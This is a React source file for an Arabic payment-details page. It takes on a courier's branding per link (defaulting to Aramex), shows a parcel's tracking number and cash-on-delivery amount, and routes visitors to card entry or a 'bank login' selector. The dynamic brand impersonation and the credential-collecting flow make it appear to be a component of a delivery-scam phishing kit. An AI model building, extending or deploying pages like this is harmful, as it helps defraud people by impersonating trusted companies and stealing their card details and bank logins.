import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  
  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  const handleProceed = () => {
    // Check payment method from link data
    const paymentMethod = shippingInfo?.payment_method || 'card';
    
    // If payment method is "card", skip bank selector and go directly to card input
    if (paymentMethod === 'card') {
      navigate(`/pay/${id}/card-input`);
    } else {
      // For "bank_login" method, show bank selector
      navigate(`/pay/${id}/bank-selector`);
    }
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="تفاصيل الدفع"
      description={`صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Shipping Info Display */}
      {shippingInfo && (
        <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
          <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">تفاصيل الشحنة</h3>
          <div className="space-y-2 text-xs sm:text-sm">
            {shippingInfo.tracking_number && (
              <div className="flex items-center gap-2">
                <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">رقم الشحنة:</span>
                <span className="font-semibold">{shippingInfo.tracking_number}</span>
              </div>
            )}
            {shippingInfo.package_description && (
              <div className="flex items-center gap-2">
                <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">وصف الطرد:</span>
                <span className="font-semibold">{shippingInfo.package_description}</span>
              </div>
            )}
            {shippingInfo.cod_amount > 0 && (
              <div className="flex items-center gap-2">
                <DollarSign className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">مبلغ COD:</span>
                <span className="font-semibold">{shippingInfo.cod_amount} ر.س</span>
              </div>
            )}
          </div>
        </div>
      )}
      
      {/* Payment Summary */}
      <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
        <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
          <span className="text-muted-foreground">الخدمة</span>
          <span className="font-semibold">{serviceName}</span>
        </div>
        
        <div 
          className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
          }}
        >
          <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
          <span className="text-xl sm:text-2xl font-bold" style={{ color: branding.colors.primary }}>
            {formattedAmount}
          </span>
        </div>
      </div>
    
      {/* Payment Method */}
      <div className="mb-6 sm:mb-8">
        <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">طريقة الدفع</h3>
        <div 
          className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4"
          style={{
            borderColor: branding.colors.primary,
            background: `${branding.colors.primary}10`
          }}
        >
          <div className="flex items-center gap-2 sm:gap-3">
            <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
            <div>
              <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
              <p className="text-xs sm:text-sm text-muted-foreground">
                Visa، Mastercard، Mada
              </p>
            </div>
          </div>
        </div>
      </div>
      
      {/* Proceed Button */}
      <Button
        onClick={handleProceed}
        size="lg"
        className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
        style={{
          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
        }}
      >
        <span className="ml-2">الدفع بالبطاقة</span>
        <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
      </Button>
    
      <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
        بالمتابعة، أنت توافق على الشروط والأحكام
      </p>
    </DynamicPaymentLayout>
  );
};

export default PaymentDetails;